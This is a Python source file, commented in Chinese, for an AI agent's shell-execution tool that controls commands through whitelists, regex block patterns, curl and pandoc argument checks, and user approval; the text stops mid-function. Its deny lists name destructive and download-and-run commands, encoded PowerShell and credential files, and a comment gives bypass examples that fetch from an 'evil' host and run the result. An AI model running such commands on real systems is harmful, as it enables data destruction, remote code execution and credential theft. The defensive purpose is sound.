"""Shell 命令执行工具

提供安全的 Shell 命令执行能力，支持：
- 命令白名单：白名单内命令直接执行
- 危险命令拦截：禁止执行 rm -rf、format、shutdown 等
- 用户确认机制：非白名单命令通过 LangGraph interrupt 暂停，等待用户确认后 resume
- 超时控制：防止命令挂起
- 输出截断：防止返回内容过大
- 工作目录限制：限制命令执行范围
"""

import logging
import os
import platform
import re
import shlex
import signal
import subprocess
from pathlib import Path

from langchain_core.runnables import RunnableConfig
from langchain_core.tools import BaseTool
from pydantic import BaseModel, Field

from Django_xm.apps.tools.base import AsyncToolMixin
from Django_xm.apps.tools.errors import TOOL_VERSION, StandardToolResult, ToolStatus
from Django_xm.common.risk_levels import RiskLevel

logger = logging.getLogger(__name__)


# ── 安全配置 ──────────────────────────────────────────────────────

# HIGH 风险判定已单源化（B3）：权威词表见
# common/sandbox/executor.py HIGH_RISK_COMMAND_PATTERNS（原 _HIGH_RISK_KEYWORDS
# 5 关键字已并入），本文件经 is_high_risk_command() 引用，禁止再建副本。

# 白名单命令前缀（这些命令可直接执行，无需用户确认）
# 注意：部分命令在 Windows 上不可用，_get_whitelist_commands 会根据平台过滤
_UNIX_ONLY_COMMANDS = {"ls", "cat", "head", "tail", "wc", "find", "which"}
_WINDOWS_ONLY_COMMANDS = {"dir", "type", "where"}

# ── manage.py 子命令枚举白名单（F-01 修复）────────────────────────
# `python manage.py` 裸前缀放行过宽：shell/dbshell/shell_plus 子命令等价
# 任意代码执行（shell -c 可 exec 任意 Python，且不含组合符绕过拼接检测）。
# 现约定：manage.py 后首参数（子命令）必须精确命中下列只读/安全集合才免审批。
_PYTHON_INTERPRETER_TOKENS = frozenset({"python", "python3"})
_MANAGE_PY_SAFE_SUBCOMMANDS = frozenset(
    {
        "help",  # 帮助（只读）
        "check",  # 项目自检（只读）
        "showmigrations",  # 迁移状态查看（只读）
        "test",  # 跑项目测试（与白名单 python -m pytest/unittest 同级语义）
    }
)
# 等价任意代码执行的子命令显式黑名单（双保险第二层：即使白名单枚举遗漏
# 也被此处拦截；第一层为 BLOCKED_PATTERNS 全局正则，工具层直接拒绝）
_MANAGE_PY_BLOCKED_SUBCOMMANDS = frozenset({"shell", "dbshell", "shell_plus"})

DEFAULT_WHITELIST_COMMANDS: list[str] = [
    # 文档转换（pandoc：仅 stdout 输出用法放行，写文件/过滤器形态走审批，
    # 见 _is_safe_readonly_pandoc）
    "pandoc",
    # Python 高频安全脚本
    # 注意：manage.py 不再整条前缀放行（F-01），其子命令由
    # _MANAGE_PY_SAFE_SUBCOMMANDS 专用枚举校验，不走通用前缀匹配
    # 注意：python -m pytest / unittest 已移出白名单（R3 1.6）——
    # 测试即任意代码执行，且 pytest 可直接指定 DATA_DIR 内上传文件路径，
    # 形成"上传文件 → 免审批执行任意代码"链；统一走 CONTROLLED 审批
    # pip 只读子命令
    "pip list",
    "pip show",
    "pip check",
    "pip3 list",
    "pip3 show",
    "pip3 check",
    # Node 包管理只读子命令（node/npx 本体已移除，需审批）
    "npm list",
    "npm view",
    "npm info",
    # 系统信息（只读）— 跨平台
    "echo",
    "whoami",
    "hostname",
    # 系统信息（只读）— Windows
    "dir",
    "type",
    "where",
    # 系统信息（只读）— Unix
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "find",
    "which",
    # Git（只读）
    "git status",
    "git log",
    "git diff",
    "git branch",
    "git show",
    "git remote",
    # 网络（只读）
    "curl",
    "ping",
]

# 严格禁止的命令模式（无论是否在白名单中都不允许）
BLOCKED_PATTERNS: list[str] = [
    # 删除
    r"\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)",
    r"\brmdir\s+/s",
    r"\bdel\s+/[sS]",
    r"\brd\s+/[sS]",
    r"\bformat\s+[a-zA-Z]:",
    # 系统操作
    r"\bshutdown\b",
    r"\breboot\b",
    r"\bhalt\b",
    r"\bpoweroff\b",
    # 权限提升
    r"\bsudo\s+rm\b",
    r"\bsu\b",
    # 危险重定向
    r">\s*/dev/sd",
    r"\bdd\s+if=",
    # 网络危险操作
    r"\bmkfs\b",
    r"\bmount\b",
    r"\bumount\b",
    # 进程杀杀杀
    r"\bkill\s+-9\s+1\b",
    r"\btaskkill\s+/f\s+/pid\s+0\b",
    # 危险脚本下载执行
    r"\bcurl\s+.*\|\s*(bash|sh|python|pwsh)",
    r"\bwget\s+.*\|\s*(bash|sh|python|pwsh)",
    # PowerShell 编码执行（pwsh 变体：-enc/-e/-EncodedCommand 可混入其他 flag）
    r"\bpwsh\s+(?:-{1,2}\S+\s+)*-e(?:nc|ncodedcommand)?\b",
    # bash/sh -c 任意命令执行
    r"\b(?:ba)?sh\s+-c\b",
    # rm 分体 flag 形态（rm -r -f / rm --recursive -f / rm --force）
    r"\brm\s+(?:-{1,2}[a-zA-Z]+\s+)+-{1,2}[a-zA-Z]*f[a-zA-Z]*\b",
    r"\brm\s+(?:-{1,2}[a-zA-Z]+\s+)*--force\b",
    # Windows 特有危险命令
    r"\bdiskpart\b",
    r"\bbcdedit\b",
    r"\breg\s+(delete|add)\b",
    r"\bnet\s+user\b",
    r"\bnet\s+localgroup\b",
    r"\bpowershell\s+-enc\b",
    r"\bpowershell\s+-e\b",
    # manage.py 等价任意代码执行的交互式子命令（F-01：shell/dbshell/shell_plus）
    # 双保险第一层：按原始命令串匹配（不受 shlex 反斜杠转义影响），工具层直接拒绝；
    # 覆盖引号变体（manage.py "shell"）与大小写变体（re.IGNORECASE）
    r"\bmanage\.py\s+[\"']?(?:dbshell|shell_plus|shell)\b",
]

# 最大输出长度（字符）
MAX_OUTPUT_LENGTH = 50000

# 默认超时（秒）
DEFAULT_TIMEOUT = 60

# 最大超时（秒）
MAX_TIMEOUT = 300

# 交互式命令超时（秒）——这些命令启动后可能不会自动退出
INTERACTIVE_COMMAND_TIMEOUT = 30

# 交互式命令前缀（启动后不自动退出的 CLI 工具）
INTERACTIVE_COMMAND_PREFIXES: list[str] = [
    "agent-browser",  # 浏览器自动化，open/snapshot 等子命令启动后进程不退出
]


def _get_effective_timeout(command: str, requested_timeout: int) -> int:
    """根据命令类型返回有效超时时间

    交互式命令（如 agent-browser）启动后进程不会自动退出，
    使用较短的超时避免长时间阻塞。
    """
    cmd_first_word = command.strip().split()[0] if command.strip() else ""
    for prefix in INTERACTIVE_COMMAND_PREFIXES:
        if cmd_first_word == prefix:
            return min(INTERACTIVE_COMMAND_TIMEOUT, requested_timeout)
    return requested_timeout


def _kill_process_tree(process: subprocess.Popen, is_windows: bool) -> None:
    """终止进程树（包括所有子进程），防止僵尸进程

    Windows 下 shell=True 启动的进程通过 cmd.exe 中转，
    subprocess.kill() 只杀 cmd.exe，子进程仍存活并持有管道，
    导致 communicate() 无法返回。必须用 taskkill /F /T 杀整个进程树。
    """
    try:
        if is_windows:
            # Windows: taskkill /F /T 强制终止整个进程树
            subprocess.run(  # noqa: S602, PLW1510  # taskkill 清理 PID 来自 Popen 对象，非用户输入；check=False 设计使然
                f"taskkill /F /T /PID {process.pid}",
                shell=True,
                capture_output=True,
                timeout=5,
            )
        else:
            # Unix: 向进程组发送 SIGTERM
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # type: ignore[attr-defined]  # POSIX-only, gracefully skipped on Windows
            except (ProcessLookupError, PermissionError, OSError):
                pass
    except Exception:  # noqa: S110  # cleanup, 进程终止失败不应影响调用方
        pass
    finally:
        # 兜底：确保主进程被终止
        try:
            process.kill()
        except (OSError, ProcessLookupError):
            pass


def _get_whitelist_commands() -> list[str]:
    """获取白名单命令列表（支持 Django settings 覆盖，根据平台过滤）"""
    try:
        from django.conf import settings as django_settings

        custom = getattr(django_settings, "SHELL_EXEC_WHITELIST", None)
        if custom is not None:
            return list(custom)
    except (ImportError, AttributeError):
        pass

    # 根据平台过滤：Windows 上移除 Unix 特有命令，Unix 上移除 Windows 特有命令
    is_windows = platform.system() == "Windows"
    filtered = []
    for cmd in DEFAULT_WHITELIST_COMMANDS:
        first_word = cmd.split()[0]
        if is_windows and first_word in _UNIX_ONLY_COMMANDS:
            continue
        if not is_windows and first_word in _WINDOWS_ONLY_COMMANDS:
            continue
        filtered.append(cmd)
    return filtered


def _is_command_blocked(command: str) -> str | None:
    """检查命令是否匹配禁止模式，返回匹配的模式描述或 None

    使用 re.DOTALL 标志使 '.' 匹配换行符，覆盖跨行命令拼接攻击
    （如 "echo ok\\nrm -rf /" 通过换行符绕过单行正则匹配）。
    """
    cmd_lower = command.lower().strip()
    for pattern in BLOCKED_PATTERNS:
        # re.DOTALL: 使 . 匹配换行符，防止跨行命令拼接绕过
        if re.search(pattern, cmd_lower, re.IGNORECASE | re.DOTALL):
            return f"匹配禁止模式: {pattern}"
    return None


# 拼接/替换/重定向/管道操作符检测模式：白名单命令携带任一符号即视为非安全，
# 强制走审批，防止以下绕过攻击（S-01）：
# - 命令拼接: "curl http://evil -o /tmp/s; bash /tmp/s.sh" / "echo ok && evil" / "echo ok & evil"
# - 短路拼接: "curl http://x || evil"
# - 命令替换: "echo $(evil)" / "echo `evil`"
# - 重定向/管道: "echo bad > /etc/passwd" / "cat file | rm -rf /"
# - 换行拼接: "echo ok\nevil"（cmd.exe/bash 均将换行视为命令分隔符）
_SHELL_COMPOSITION_PATTERN = re.compile(r"[;|&<>`\n\r]|\$\(")


def _has_shell_composition(command: str) -> bool:
    """检测命令是否包含拼接/替换/重定向/管道符号

    白名单命令（如 echo/curl/pandoc）携带任一此类符号时均可构造任意命令执行，
    必须强制走审批流程，不允许直接执行。

    Returns:
        True 表示命令包含拼接/替换/重定向/管道符号
    """
    return bool(_SHELL_COMPOSITION_PATTERN.search(command))


def _tokenize_command(command: str) -> list[str] | None:
    """shlex 分词（白名单严格首词匹配依据）

    Returns:
        分词结果列表；引号不配对等解析失败返回 None（fail-closed，按非白名单处理）
    """
    try:
        return shlex.split(command)
    except ValueError:
        return None


def _tokenize_command_raw(command: str) -> list[str] | None:
    """非 POSIX 模式 shlex 分词（保留引号与 Windows 反斜杠路径原样）

    POSIX 模式会把 "C:\\Users\\a.txt" 的反斜杠当转义符吞噬
    （→ "C:Usersa.txt"），curl -o / pandoc 等涉及本地路径参数的校验必须
    用本分词（与 _validate_file_read_command_paths 同口径），引号由调用方
    统一剥离。

    Returns:
        分词结果列表；引号不配对等解析失败返回 None（fail-closed）
    """
    try:
        return shlex.split(command, posix=False)
    except ValueError:
        return None


def _strip_token_quotes(token: str) -> str:
    """剥离非 POSIX 分词保留的外层引号（成对引号由 shlex 保留在 token 首尾）。"""
    return token.strip('"').strip("'")


def _is_manage_py_command(tokens: list[str]) -> bool:
    """判定 tokens 是否为 `python manage.py` 命令形态（精确词匹配，大小写敏感）

    首词必须是 python/python3（绝对路径解释器如 C:/Python/python.exe 不匹配，
    fail-closed）；第二词必须精确为 manage.py（禁止路径变体，防止指向任意脚本）。
    """
    return (
        len(tokens) >= 2
        and tokens[0] in _PYTHON_INTERPRETER_TOKENS
        and tokens[1] == "manage.py"
    )


def _is_manage_py_subcommand_whitelisted(tokens: list[str]) -> bool:
    """manage.py 形态的子命令枚举校验（F-01）

    manage.py 后首参数必须命中安全子命令集合；shell/dbshell/shell_plus 显式
    拒绝（双保险第二层）；migrate 仅在携带 --check（只读检查形态）时放行；
    其余一律拒绝（走审批，不自动放行）。
    """
    subcommand = tokens[2] if len(tokens) > 2 else ""
    if subcommand in _MANAGE_PY_BLOCKED_SUBCOMMANDS:
        return False
    if subcommand in _MANAGE_PY_SAFE_SUBCOMMANDS:
        return True
    if subcommand == "migrate":
        return "--check" in tokens[3:]
    return False


def _is_command_whitelisted(command: str, working_dir: str = "") -> bool:
    """检查命令是否在白名单中（严格匹配，fail-closed）

    白名单放行必须同时满足：
    1. 命令不含任何拼接/替换/重定向/管道符号（; && & || | > >> < << $( ` 换行）
    2. shlex 分词后前导词严格命中白名单条目：
       - 单词条目（如 "curl"）：首词全等
       - 多词条目（如 "git status"）：前 N 个词全等
       防止白名单命令名出现在参数位置或经子串误判放行（S-01）
    3. python manage.py 形态不适用通用前缀匹配（F-01）：
       即使自定义 SHELL_EXEC_WHITELIST 含 manage.py 条目，也强制走子命令
       枚举校验（_is_manage_py_subcommand_whitelisted），防止前缀过宽回潮
    4. 参数级校验（F3，决策 D4；R3 1.4/1.6 扩展）：
       - 文件读取类命令（cat/type/ls/dir/head/tail/wc/find）与 pandoc 的路径
         参数须在 SHELL_EXEC_ALLOWED_DIRS/DATA_DIR 内；纯相对路径先按实际
         工作目录（working_dir，缺省进程 cwd）resolve 后再校验——`cat .env`
         类命令不得免审批
       - curl 仅放行 GET 类只读用法（-X 只允许 GET、URL 协议白名单
         http/https、输出目标限制在允许目录内，R3 1.1）
       - pandoc 仅放行 stdout 输出用法（禁 -o/--output 写文件与
         --lua-filter/--filter 代码执行面，R3 1.6）
       任一不满足 → 移出白名单走审批
    任一不满足 → 返回 False（走既有审批路径，不自动放行）

    Args:
        command: 待判定命令串
        working_dir: 工具调用的 working_dir 参数（相对路径 resolve 基准；
            与执行层 _get_safe_working_dir 的实际执行目录同源）
    """
    if _has_shell_composition(command):
        return False

    tokens = _tokenize_command(command)
    if not tokens:
        return False

    if _is_manage_py_command(tokens):
        return _is_manage_py_subcommand_whitelisted(tokens)

    matched_first_word: str | None = None
    for wl_cmd in _get_whitelist_commands():
        wl_tokens = wl_cmd.split()
        if tokens[: len(wl_tokens)] == wl_tokens:
            matched_first_word = wl_tokens[0]
            break
    if matched_first_word is None:
        return False

    # F3 参数级校验：白名单前缀命中后，按命令类别追加校验
    if matched_first_word in _FILE_READ_WHITELIST_COMMANDS:
        # 传原始命令串（Windows 路径需非 POSIX 分词，见
        # _validate_file_read_command_paths）
        return _validate_file_read_command_paths(command, working_dir)
    if matched_first_word == "curl":
        # R3：curl 校验用非 POSIX 分词（输出目标可能为 Windows 反斜杠路径，
        # POSIX 分词会吞噬反斜杠导致校验失真）；引号在 validator 内统一剥离
        raw_tokens = _tokenize_command_raw(command)
        if not raw_tokens:
            return False  # 引号不配对，fail-closed
        return _is_safe_readonly_curl(raw_tokens, working_dir)
    if matched_first_word == "pandoc":
        raw_tokens = _tokenize_command_raw(command)
        if not raw_tokens:
            return False  # 引号不配对，fail-closed
        return _is_safe_readonly_pandoc(raw_tokens, working_dir)
    return True


def _get_safe_working_dir(working_dir: str = "") -> str:
    """获取安全的工作目录"""
    if working_dir:
        wd = Path(working_dir).resolve()
        # 检查是否在允许的目录范围内
        try:
            from django.conf import settings as django_settings

            allowed_dirs = getattr(django_settings, "SHELL_EXEC_ALLOWED_DIRS", None)
            if allowed_dirs:
                for ad in allowed_dirs:
                    # F3：is_relative_to 严格包含判断——startswith 存在前缀绕过
                    # （允许 D:\proj 时 "D:\proj-evil" 被误判在允许范围内）
                    if wd.is_relative_to(Path(ad).resolve()):
                        return str(wd)
                # 不在允许目录中
                return os.getcwd()
        except (ImportError, AttributeError):
            pass
        return str(wd)
    return os.getcwd()


# ── 白名单参数级校验（F3，决策 D4；R3 1.1/1.4/1.5/1.6 扩展）────────
# 文件读取类白名单命令：参数中的路径须限制在允许目录内，防止
# `cat C:\Users\...\secret` 等越权读取免审批直通
_FILE_READ_WHITELIST_COMMANDS = frozenset({"cat", "type", "ls", "dir", "head", "tail", "wc", "find"})

# curl 外传/上传形态参数：出现即移出白名单（走 CONTROLLED 审批，不直接拒绝）
_CURL_UPLOAD_FLAGS = frozenset(
    {
        "-d",
        "--data",
        "--data-raw",
        "--data-ascii",
        "--data-binary",
        "--data-urlencode",
        "-T",
        "--upload-file",
        "-F",
        "--form",
        "--form-string",
    }
)

# R3 1.1 curl 写出/配置类 flag：
# - 输出目标类（_CURL_OUTPUT_VALUE_FLAGS）：输出目标路径经
#   _is_path_within_allowed_dirs 同源校验（写目标必须在允许目录内），
#   越界/无法校验即拦截走审批；
# - 一律拦截类（_CURL_BLOCK_FLAGS）：-O/-J 的落盘文件名来自远端
#   Content-Disposition 响应头，无法在本层预先校验；-K/--config 的配置文件
#   内容可重写 curl 全部行为（含追加 -o/-d），参数级校验失效 → 一律走审批。
_CURL_OUTPUT_VALUE_FLAGS = frozenset({"-o", "--output", "--output-dir", "-c", "--cookie-jar", "-D", "--dump-header"})
_CURL_OUTPUT_LONG_PREFIXES = ("--output=", "--output-dir=", "--cookie-jar=", "--dump-header=")
_CURL_BLOCK_FLAGS = frozenset({"-O", "-J", "-K", "--config"})
# 短选项簇（如 -sS、-kL）中视为写盘/配置的字符：o(c 之前先命中 -o 写出)、
# O/J/K（写出/配置）、c（cookie-jar 写盘）、D（dump-header 写盘）
_CURL_CLUSTER_WRITE_CHARS = frozenset("oOJKcD")
# 取值的普通 flag：其值 token 不参与 URL 协议校验（如 -H 'X: y' 的值
# "X: y" 不是 URL）。未列入表 flag 的取值 token 会被当作 URL 候选参与
# 协议校验——校验失败走审批（fail-closed，仅收紧放行面）。
_CURL_VALUE_FLAGS = frozenset(
    {
        "-H", "--header",
        "-A", "--user-agent",
        "-e", "--referer",
        "-b", "--cookie",
        "-m", "--max-time",
        "--connect-timeout",
        "-x", "--proxy",
        "-w", "--write-out",
        "-z", "--time-cond",
        "--retry",
        "-u", "--user",
    }
)
# R3 1.1：curl URL 协议白名单——禁 file://（本地文件读）、gopher://、dict://
# （SSRF 打内网服务）、ftp/telnet/ldap 等一切非 http(s) 协议
_CURL_ALLOWED_SCHEMES = frozenset({"http", "https"})

# R3 1.4：敏感文件名（读取类命令命中即移出白名单走审批，即使路径在允许
# 目录内——`cat .env` 类命令不得免审批）。大小写不敏感；.env.* 含
# .env.example（误伤仅表现为走一次审批，fail-closed 方向）。
_SENSITIVE_FILE_NAMES = frozenset({".env", ".git-credentials", ".netrc", "id_rsa", "id_ed25519", "id_ecdsa", ".npmrc"})
_SENSITIVE_FILE_SUFFIXES = (".pem", ".key")


def _is_sensitive_file_path(path: Path) -> bool:
    """判断路径最终文件名是否命中敏感文件模式（凭据/密钥类）。"""
    name = path.name.lower()
    if name in _SENSITIVE_FILE_NAMES:
        return True
    if name.startswith(".env."):
        return True
    return name.endswith(_SENSITIVE_FILE_SUFFIXES)


def _get_allowed_exec_dirs() -> list[Path]:
    """白名单文件读取类命令的路径允许范围（与 _get_safe_working_dir 同源配置）。

    SHELL_EXEC_ALLOWED_DIRS + DATA_DIR（base.py 默认前者已含后者，显式并集
    防自定义覆盖 ALLOWED_DIRS 时遗漏 DATA_DIR）。

    R3 1.5 fail-closed：允许目录为空时不视为"不限制"，调用方
    （_validate_file_read_command_paths / curl 输出目标校验）必须拒绝放行
    并 error 留痕——允许范围未定义 = 无法证明路径合法 = 不得免审批。
    """
    from django.conf import settings as django_settings

    allowed = getattr(django_settings, "SHELL_EXEC_ALLOWED_DIRS", None) or []
    dirs = [Path(d).resolve() for d in allowed]
    data_dir = getattr(django_settings, "DATA_DIR", None)
    if data_dir:
        data_resolved = Path(data_dir).resolve()
        if not any(d == data_resolved for d in dirs):
            dirs.append(data_resolved)
    return dirs


def _is_path_within_allowed_dirs(
    path_str: str, allowed_dirs: list[Path], base_dir: str | None = None
) -> bool:
    """判断路径参数是否落在允许目录内（fail-closed）。

    R3 1.4：相对路径（含 ``..`` 穿越形态）不再无条件放行——先按实际工作
    目录 resolve（base_dir，缺省进程 cwd，与执行层 _get_safe_working_dir
    同源），再按 resolve 后严格包含判断（is_relative_to）。绝对路径与无盘符
    根锚定形态（Windows 的 "/etc/passwd"，锚定到当前盘根，is_absolute() 为
    False 但不受运行时 cwd 相对性保护）同样按 resolve 后包含判断。

    Args:
        path_str: 待校验路径 token（保留原样，含引号时由调用方剥离）
        allowed_dirs: 允许目录列表（为空时 any() 恒 False，fail-closed）
        base_dir: 相对路径 resolve 基准目录（工具调用 working_dir 的
            resolve 结果；None 表示进程 cwd）
    """
    p = Path(path_str)
    if not p.is_absolute() and not p.drive and not p.root:
        base = Path(base_dir).resolve() if base_dir else Path.cwd()
        resolved = (base / p).resolve(strict=False)
    else:
        resolved = p.resolve(strict=False)
    return any(resolved.is_relative_to(ad) for ad in allowed_dirs)


def _resolve_allowed_base_dir(working_dir: str = "") -> Path:
    """相对路径 resolve 的基准目录（与执行层实际执行目录同源）。

    working_dir 非空时与 _get_safe_working_dir 同序 resolve；为空时返回
    进程 cwd（即命令的实际执行目录）。
    """
    return Path(working_dir).resolve() if working_dir else Path.cwd()


def _validate_file_read_command_paths(command: str, working_dir: str = "") -> bool:
    """校验文件读取类白名单命令的路径参数（F3；R3 1.4/1.5 扩展）

    - 相对路径按实际工作目录（working_dir，缺省 cwd）resolve 后校验——
      `cat .env` 等敏感文件相对路径不再免审批（R3 1.4）；
    - 敏感文件（.env/凭据/密钥类）即使路径在允许目录内也移出白名单走审批
      （R3 1.4）；
    - 允许目录未配置 → fail-closed 拒绝放行 + error 留痕（R3 1.5）。

    用非 POSIX 模式分词：Windows 反斜杠路径在 POSIX 模式下被当转义符吞噬
    （"C:\\Users\\a.txt" → "C:Usersa.txt"），路径提取必须保留原样；
    非 POSIX 模式保留引号，手动剥离。
    """
    allowed_dirs = _get_allowed_exec_dirs()
    if not allowed_dirs:
        # R3 1.5：允许范围未定义时不得视为"不限制"（fail-closed + error 留痕）
        logger.error(
            "shell_exec: SHELL_EXEC_ALLOWED_DIRS/DATA_DIR 均未配置，"
            f"白名单文件读取命令 fail-closed 拒绝放行: {command[:100]}"
        )
        return False
    base_dir = _resolve_allowed_base_dir(working_dir)
    try:
        tokens = shlex.split(command, posix=False)
    except ValueError:
        return False  # 引号不配对，fail-closed
    for raw in tokens[1:]:
        token = raw.strip('"').strip("'")
        if token.startswith("-"):
            continue
        if not _is_path_within_allowed_dirs(token, allowed_dirs, base_dir=str(base_dir)):
            return False
        if _is_sensitive_file_path(Path(token)):
            return False
    return True


def _is_curl_url_allowed(token: str) -> bool:
    """curl URL token 协议白名单（R3 1.1）。

    - 无 scheme 的 token 放行（curl 缺省按 http:// 处理，等价 GET）；
    - scheme 命中 http/https 放行；
    - 其余（file://、gopher://、dict://、ftp://、telnet://、ldap:// 及一切
      未识别 scheme，含 "host:port" 无 scheme 形态的误判）一律拒绝走审批
      （fail-closed）。
    """
    from urllib.parse import urlparse

    scheme = urlparse(token).scheme.lower()
    if not scheme:
        return True
    return scheme in _CURL_ALLOWED_SCHEMES


def _curl_output_target_ok(target: str, working_dir: str) -> bool:
    """curl 输出目标路径同源校验（R3 1.1③）：写目标必须在允许目录内。

    允许目录未配置时直接拒绝（与 _validate_file_read_command_paths 的
    fail-closed 语义一致）。
    """
    allowed_dirs = _get_allowed_exec_dirs()
    if not allowed_dirs:
        logger.error(
            "shell_exec: SHELL_EXEC_ALLOWED_DIRS/DATA_DIR 均未配置，"
            f"curl 输出目标校验 fail-closed 拒绝放行: {target[:80]}"
        )
        return False
    base_dir = _resolve_allowed_base_dir(working_dir)
    return _is_path_within_allowed_dirs(target.strip('"').strip("'"), allowed_dirs, base_dir=str(base_dir))


def _is_safe_readonly_curl(tokens: list[str], working_dir: str = "") -> bool:
    """curl 白名单放行仅限只读 GET 类用法（F3；R3 1.1 收紧）

    - -X/--request 的值只允许 GET（含 -XGET / --request=GET 粘连形态）；
    - 禁止 -d/-T/--data/--upload/-F/--form 等外传/上传形态（含粘连形态
      -dkey=val / -Tfile，"--" 开头变体如 --digest/--trace 不误伤）；
    - 禁止写出/配置 flag：-O/-J/-K/--config 一律拦截（落盘名不可预校验 /
      配置文件可重写全部行为）；-o/--output/--output-dir/-c/--cookie-jar/
      -D/--dump-header 的输出目标经允许目录同源校验，越界拦截；
    - 短选项簇（如 -sSo、-OJ）出现任一写盘字符即拦截；
    - URL 协议白名单 http/https（禁 file://、gopher://、dict://、ftp://、
      telnet://、ldap:// 等）。
    违规返回 False → 走 CONTROLLED 审批。

    Args:
        tokens: 非 POSIX 分词结果（保留反斜杠路径原样，外层引号在循环内剥离）
        working_dir: 输出目标相对路径的 resolve 基准
    """
    i = 1
    n = len(tokens)
    while i < n:
        token = _strip_token_quotes(tokens[i])

        # 1) 外传/上传形态（含粘连，F3 既有语义）
        if token in _CURL_UPLOAD_FLAGS:
            return False
        if token.startswith("-d") and not token.startswith("--"):
            return False
        if token.startswith("-T") and not token.startswith("--"):
            return False

        # 2) 一律拦截的写出/配置 flag（长前缀粘连形态 --config=path 同拦）
        if token in _CURL_BLOCK_FLAGS or token.startswith("--config"):
            return False

        # 3) 输出目标类 flag：目标路径同源校验（允许目录内才放行）
        matched_output = False
        for prefix in _CURL_OUTPUT_LONG_PREFIXES:
            if token.startswith(prefix):
                if not _curl_output_target_ok(token.split("=", 1)[1], working_dir):
                    return False
                matched_output = True
                break
        if matched_output:
            i += 1
            continue
        if token in _CURL_OUTPUT_VALUE_FLAGS:
            if i + 1 >= n:
                return False  # 缺输出目标参数，fail-closed
            if not _curl_output_target_ok(tokens[i + 1], working_dir):
                return False
            i += 2
            continue

        # 4) 短选项簇（单个 "-" 且长度 >2）：出现写盘/配置字符即拦截，
        #    防止 -sSo file / -OJ / -kD file 等组合形态绕过
        if token.startswith("-") and not token.startswith("--") and len(token) > 2:
            if any(ch in _CURL_CLUSTER_WRITE_CHARS for ch in token[1:]):
                return False

        # 5) -X/--request GET 限定（F3 既有语义，粘连形态覆盖）
        if token in ("-X", "--request"):
            if i + 1 >= len(tokens) or tokens[i + 1].upper() != "GET":
                return False
            i += 2
            continue
        if token.startswith("--request=") and token.split("=", 1)[1].upper() != "GET":
            return False
        if token.startswith("-X") and len(token) > 2 and token[2:].upper() != "GET":
            return False

        # 6) 取值 flag：值 token 不参与 URL 协议校验
        if token in _CURL_VALUE_FLAGS:
            i += 2
            continue

        # 7) URL 协议白名单（非 flag token 即 URL 候选）
        if not token.startswith("-"):
            if not _is_curl_url_allowed(token):
                return False

        i += 1
    return True


# R3 1.6 pandoc 白名单参数级校验：pandoc 可写文件（-o）并可经
# --lua-filter/--filter 执行任意 Lua/可执行过滤器（等价代码执行），
# 仅放行"stdin/stdout 纯转换、输入文件在允许目录内"的用法。
_PANDOC_BLOCK_FLAGS = frozenset(
    {"-o", "--output", "--output-dir", "--extract-media", "--log", "--lua-filter", "--filter"}
)
_PANDOC_BLOCK_LONG_PREFIXES = ("--output=", "--output-dir=", "--extract-media=", "--log=", "--lua-filter=", "--filter=")
# 取值的非路径 flag（格式/元数据类，其值不参与路径校验）
_PANDOC_VALUE_FLAGS = frozenset(
    {"-f", "--from", "--read", "-t", "--to", "--write", "-M", "--metadata", "-V", "--variable", "--indented-code-classes", "--column-spec"}
)


def _is_safe_readonly_pandoc(tokens: list[str], working_dir: str = "") -> bool:
    """pandoc 白名单仅放行 stdout 输出、无代码执行面的用法（R3 1.6）

    - 禁 -o/--output/--output-dir/--extract-media/--log（写文件 → 审批，
      与 fs_write_file 的 CONTROLLED 口径一致）；
    - 禁 --lua-filter/--filter（任意代码执行面）；
    - 格式/元数据类取值 flag（-f/-t/-M/-V 等）的值跳过路径校验；
    - 其余非 flag token 一律按路径校验（输入文件须在允许目录内）。
    违规返回 False → 走 CONTROLLED 审批。

    Args:
        tokens: 非 POSIX 分词结果（保留反斜杠路径原样，外层引号在循环内剥离）
        working_dir: 输入路径相对路径的 resolve 基准
    """
    allowed_dirs = _get_allowed_exec_dirs()
    if not allowed_dirs:
        logger.error(
            f"shell_exec: SHELL_EXEC_ALLOWED_DIRS/DATA_DIR 均未配置，"
            f"pandoc fail-closed 拒绝放行（{' '.join(tokens)[:100]}）"
        )
        return False
    base_dir = str(_resolve_allowed_base_dir(working_dir))
    i = 1
    n = len(tokens)
    while i < n:
        token = _strip_token_quotes(tokens[i])
        if token in _PANDOC_BLOCK_FLAGS or any(token.startswith(p) for p in _PANDOC_BLOCK_LONG_PREFIXES):
            return False
        if token.startswith("-") and not token.startswith("--") and len(token) > 2:
            # 短选项簇携带 -o（如 -fo html? pandoc 无此组合，防御性拦截）
            if "o" in token[1:]:
                return False
            # 其余簇字符均为无值 flag（pandoc 短 flag 均不取值）
            i += 1
            continue
        if token in _PANDOC_VALUE_FLAGS:
            i += 2
            continue
        if token.startswith("-"):
            # 无值 flag（-s/-S/-N 等，含长选项）：跳过，不参与路径校验
            i += 1
            continue
        # 非 flag token：按路径校验（输入文件须在允许目录内）
        if not _is_path_within_allowed_dirs(token.strip('"').strip("'"), allowed_dirs, base_dir=base_dir):
            return False
        if _is_sensitive_file_path(Path(token)):
            return False
        i += 1
    return True


def _adapt_command_for_platform(command: str) -> str:
    """适配命令到当前平台（Windows 兼容性处理）

    Windows 的常见兼容性问题：
    - mkdir -p <path>: Windows mkdir 默认递归创建父目录，-p 会被当作目录名
    - mkdir --parents <path>: 同上，GNU 长选项也不支持
    - rm -rf / rm -r / rm -f: Windows 没有 rm，但 Git Bash 等环境可能有
    - cp -r: Windows 没有 cp -r
    - touch: Windows 没有 touch
    - ls: Windows 没有 ls（有 dir）
    - cat: Windows 没有 cat（有 type）
    - grep: Windows 没有原生 grep
    """
    if platform.system() != "Windows":
        return command

    adapted = command

    # mkdir -p <path> → mkdir <path>（Windows mkdir 默认递归创建）
    adapted = re.sub(r"\bmkdir\s+-p\s+", "mkdir ", adapted)
    # mkdir --parents <path> → mkdir <path>
    adapted = re.sub(r"\bmkdir\s+--parents\s+", "mkdir ", adapted)

    # rm -rf <path> → rmdir /s /q <path>（目录）或 del /f /q <path>（文件）
    # 注意：rm -rf 是危险操作，通常会被 BLOCKED_PATTERNS 拦截，
    # 这里只处理 rm -r（不带 -f）的情况
    adapted = re.sub(r"\brm\s+-r\s+", "rmdir /s /q ", adapted)

    # cp -r <src> <dst> → xcopy /e /i <src> <dst>
    adapted = re.sub(r"\bcp\s+-r\s+", "xcopy /e /i ", adapted)

    # touch <file> → type nul > <file>（Windows 创建空文件）
